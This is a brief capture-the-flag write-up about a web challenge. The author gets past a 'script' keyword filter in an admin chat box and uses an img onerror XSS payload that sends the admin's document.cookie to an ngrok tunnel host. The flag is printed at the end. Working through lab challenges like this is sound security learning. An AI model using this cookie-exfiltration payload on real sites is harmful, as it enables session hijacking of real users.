This task gives us a link [https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/). The website contains a video and a chat window on the right side. It appears that we are chatting with an admin and so it probably requires another xss. However, entering a tag like `<script>` will show up as `HACKER ALERT!`  so it seems that there is some kind check that matches against words like script. Playing around with other tags like `<img>` seem to work however so we can use that instead.

Again, I setup up a ngrok tunnel and used the `onerror` attribute of the `img` tag to send to cookie. This trick I learned about from [https://xss-game.appspot.com/](https://xss-game.appspot.com/)
```html
<img src="?" onerror="document.location='http://???.ngrok.io/?'+document.cookie">
```

Pasting that in the chat window gives us the cookie `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`